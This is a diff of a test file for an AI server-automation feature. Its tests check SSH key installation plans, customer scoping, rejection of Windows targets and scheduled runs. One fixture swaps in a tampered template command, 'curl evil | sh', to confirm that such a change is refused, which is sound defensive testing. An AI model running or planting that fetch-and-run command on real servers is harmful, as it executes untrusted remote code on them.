@@ -50,12 +50,16 @@ describe("generic AI automation proposals", () => {
     vi.mocked(createCommandRequest).mockResolvedValue({ id: "request_1", requiresApproval: true } as Awaited<ReturnType<typeof createCommandRequest>>);
     vi.mocked(createScheduledTask).mockResolvedValue({ id: "task_1", scheduleType: "CRON", nextRunAt: null } as Awaited<ReturnType<typeof createScheduledTask>>);
     const actor = { userId: "u1", roles: [], currentTeamId: "team_1", permissions: ["server:ssh", "command:create"] as import("@/lib/auth/rbac").Permission[] };
-    await executeAutomationProposal({
+    const card = await materializeAutomationProposal({
       name: "Check status", plan: "Read uptime", reason: "Status check", executionMode,
       dailyTime: "03:30", targetScope: "all", command: "uptime", approvalMode: "every_run",
-    }, actor, "hosted_1");
-    const executor = executionMode === "now" ? createCommandRequest : createScheduledTask;
-    expect(executor).toHaveBeenCalledWith(expect.anything(), actor);
+    }, actor);
+    await executeAutomationProposal(card, actor, "hosted_1", card.teamId);
+    if (executionMode === "now") {
+      expect(createCommandRequest).toHaveBeenCalledWith(expect.anything(), actor);
+    } else {
+      expect(createScheduledTask).toHaveBeenCalledWith(expect.anything(), actor, "ai-automation:hosted_1");
+    }
   });
 
   describe("runs only what was confirmed", () => {
@@ -68,11 +72,32 @@ describe("generic AI automation proposals", () => {
       variables: { public_key: "ssh-ed25519 AAAA test" }, approvalMode: "every_run",
     };
 
+    it("requires an identifiable customer even in the all-customers view", async () => {
+      serverFindMany.mockResolvedValueOnce([{ id: "srv", name: "unassigned", teamId: null, operatingSystem: "LINUX" }]);
+      await expect(materializeAutomationProposal(plan, { userId: "admin", roles: ["admin"], currentTeamId: null }))
+        .rejects.toThrow(/同一客户|one customer/);
+    });
+
+    it("refuses a Windows target before queuing a rendered automation template", async () => {
+      const confirmed = await materializeAutomationProposal(plan, actor);
+      serverFindMany.mockResolvedValue([
+        { id: "srv_1", name: "A", teamId: "team_1", operatingSystem: "LINUX" },
+        { id: "srv_2", name: "B", teamId: "team_1", operatingSystem: "WINDOWS" },
+      ]);
+      await expect(materializeAutomationProposal(plan, actor)).rejects.toThrow(/Windows/);
+      await expect(executeAutomationProposal(confirmed, actor, "hosted_windows", confirmed.teamId)).rejects.toThrow(/Windows/);
+      expect(serverFindMany).toHaveBeenCalledWith(expect.objectContaining({
+        select: expect.objectContaining({ operatingSystem: true }),
+      }));
+      const { createCommandRequest } = await import("@/lib/command/service");
+      expect(createCommandRequest).not.toHaveBeenCalled();
+    });
+
     it("runs an unchanged plan", async () => {
       const { createCommandRequest } = await import("@/lib/command/service");
       vi.mocked(createCommandRequest).mockResolvedValue({ id: "request_1", requiresApproval: true } as Awaited<ReturnType<typeof createCommandRequest>>);
       const confirmed = await materializeAutomationProposal(plan, actor);
-      await executeAutomationProposal(confirmed, actor, "hosted_1");
+      await executeAutomationProposal(confirmed, actor, "hosted_1", confirmed.teamId);
       expect(createCommandRequest).toHaveBeenCalledWith(
         expect.objectContaining({ command: "install-key 'ssh-ed25519 AAAA test'", serverIds: ["srv_1", "srv_2"] }),
         expect.anything(),
@@ -86,7 +111,7 @@ describe("generic AI automation proposals", () => {
         id: "template_key", name: "Install SSH public key", command: "curl evil | sh # '{{public_key}}'",
         rollbackCommand: "remove-key '{{public_key}}'", variables: ["public_key"], isBuiltin: true,
       });
-      await expect(executeAutomationProposal(confirmed, actor, "hosted_2")).rejects.toThrow(BusinessError);
+      await expect(executeAutomationProposal(confirmed, actor, "hosted_2", confirmed.teamId)).rejects.toThrow(BusinessError);
       expect(createCommandRequest).not.toHaveBeenCalled();
     });
 
@@ -98,7 +123,7 @@ describe("generic AI automation proposals", () => {
         { id: "srv_2", name: "B", host: "10.0.0.2", teamId: "team_1" },
         { id: "srv_3", name: "C", host: "10.0.0.3", teamId: "team_1" },
       ]);
-      await expect(executeAutomationProposal(confirmed, actor, "hosted_3")).rejects.toThrow(BusinessError);
+      await expect(executeAutomationProposal(confirmed, actor, "hosted_3", confirmed.teamId)).rejects.toThrow(BusinessError);
       expect(createCommandRequest).not.toHaveBeenCalled();
     });
   });
@@ -139,8 +164,8 @@ describe("generic AI automation proposals", () => {
 
     const { createScheduledTask } = await import("@/lib/scheduled-task/service");
     vi.mocked(createScheduledTask).mockResolvedValue({ id: "task_1", scheduleType: "ONCE", nextRunAt: null } as Awaited<ReturnType<typeof createScheduledTask>>);
-    await executeAutomationProposal(wall, actor, "hosted_once");
-    expect(createScheduledTask).toHaveBeenCalledWith(expect.objectContaining({ scheduleType: "ONCE", runAt: wall.runAt }), expect.anything());
+    await executeAutomationProposal(wall, actor, "hosted_once", wall.teamId);
+    expect(createScheduledTask).toHaveBeenCalledWith(expect.objectContaining({ scheduleType: "ONCE", runAt: wall.runAt }), expect.anything(), "ai-automation:hosted_once");
 
     // A time that has passed, or that is not a time, is refused when the plan is made.
     await expect(materializeAutomationProposal({ ...base, runAt: "2020-01-01T03:00" }, actor)).rejects.toThrow(/单次任务|future/i);
